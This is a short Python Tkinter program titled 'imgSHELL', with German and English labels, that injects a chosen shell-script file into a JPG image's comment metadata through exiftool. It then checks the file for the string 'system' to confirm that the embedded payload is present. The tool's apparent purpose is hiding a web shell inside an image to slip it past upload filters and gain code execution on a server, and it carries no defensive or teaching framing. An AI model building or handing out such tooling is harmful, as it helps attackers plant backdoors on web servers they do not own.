import tkinter as tk
from tkinter import filedialog
import subprocess

root = tk.Tk()
root.title("imgSHELL")

def choose_shell():
    shell_path = filedialog.askopenfilename()
    if shell_path:
        shell_entry.delete(0, tk.END)
        shell_entry.insert(0, shell_path)

def choose_file():
    file_path = filedialog.askopenfilename()
    if file_path:
        file_entry.delete(0, tk.END)
        file_entry.insert(0, file_path)

def run_command():
    shell_path = shell_entry.get()
    file_path = file_entry.get()
    if shell_path and file_path:
        subprocess.call(["exiftool", f"-comment<={shell_path}", file_path])
        output = subprocess.check_output(["strings", file_path])
        if "system" in output.decode():
            result_label.config(text="Die Operation wurde erfolgreich abgeschlossen!")
        else:
            result_label.config(text="Please check the image with Exiftool")
    else:
        result_label.config(text="Wählen Sie eine Bilddatei und ein Shell-Skript aus.")

shell_label = tk.Label(root, text="Shell-Skript:")
shell_label.grid(row=0, column=0, padx=5, pady=5)

shell_entry = tk.Entry(root, width=50)
shell_entry.grid(row=0, column=1, padx=5, pady=5)

shell_button = tk.Button(root, text="Durchsuchen", command=choose_shell)
shell_button.grid(row=0, column=2, padx=5, pady=5)

file_label = tk.Label(root, text="Bilddatei:")
file_label.grid(row=1, column=0, padx=5, pady=5)

file_entry = tk.Entry(root, width=50)
file_entry.grid(row=1, column=1, padx=5, pady=5)

file_button = tk.Button(root, text="Durchsuchen", command=choose_file)
file_button.grid(row=1, column=2, padx=5, pady=5)

run_button = tk.Button(root, text="Ausführen", command=run_command)
run_button.grid(row=2, column=1, padx=5, pady=5)

result_label = tk.Label(root, text="")
result_label.grid(row=3, column=0, columnspan=3, padx=5, pady=5)

important1 = tk.Label(root, text="ONLY USE .JPG FILES")
important1.grid(row=4, column=0, columnspan=3, padx=5, pady=5)


root.mainloop()
